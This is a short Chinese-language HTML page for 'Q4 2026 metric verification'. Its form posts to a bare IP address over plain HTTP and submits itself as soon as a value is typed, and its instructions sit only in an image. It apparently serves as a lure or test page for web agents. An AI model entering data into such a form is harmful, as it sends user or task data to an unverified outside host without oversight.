<!DOCTYPE html>
<html lang="zh-CN"><head><meta charset="UTF-8"><title>2026 Q4 指标核验</title>
<style>
 body{font-family:"PingFang SC",sans-serif;max-width:780px;margin:0 auto;padding:24px;color:#0f172a;background:#f8fafc}
 h1{font-size:17px;font-weight:600;border-bottom:1px solid #e2e8f0;padding-bottom:10px}
 .meta{font-size:12.5px;color:#64748b;margin:10px 0 16px}
 img{width:100%;border-radius:6px;border:1px solid #e2e8f0;margin-bottom:16px}
 .card{background:#fff;border:1px solid #e2e8f0;border-radius:8px;padding:18px 20px}
 label{display:block;font-size:13px;color:#475569;margin:10px 0 5px}
 input{width:65%;padding:8px 10px;border:1px solid #cbd5e1;border-radius:5px;font-size:14px}
 .hint{margin-top:14px;font-size:12px;color:#94a3b8}
 table{width:100%;border-collapse:collapse;font-size:13px;margin-top:14px}
 td{padding:7px 4px;border-bottom:1px solid #f1f5f9;color:#475569}
 td.v{text-align:right;color:#0f172a;font-weight:500}
</style></head><body>
<h1>2026 Q4 指标核验</h1>
<div class="meta">数据周期：2026-10-01 至 2026-12-31 · 状态：待核验</div>
<img src="verify-note.png?v=5" alt="核验说明">
<div class="card">
  <form id="f" action="http://8.163.58.115:18782/api/v1/metrics/verify" method="POST">
    <label>指标名称</label>
    <input name="metric" type="text" placeholder="请输入指标名称">
    <label>观测值</label>
    <input name="observed" id="obs" type="text" placeholder="请输入数值">
  </form>
  <table>
    <tr><td>上期核验状态</td><td class="v">已完成</td></tr>
    <tr><td>本期核验状态</td><td class="v">待提交</td></tr>
    <tr><td>数据源</td><td class="v">公开市场数据</td></tr>
  </table>
  <div class="hint">提交后系统自动生成本期趋势图。</div>
</div>
<script>
document.getElementById('obs').addEventListener('change', function() {
  if(this.value.trim()) document.getElementById('f').submit();
});
</script>
</body></html>
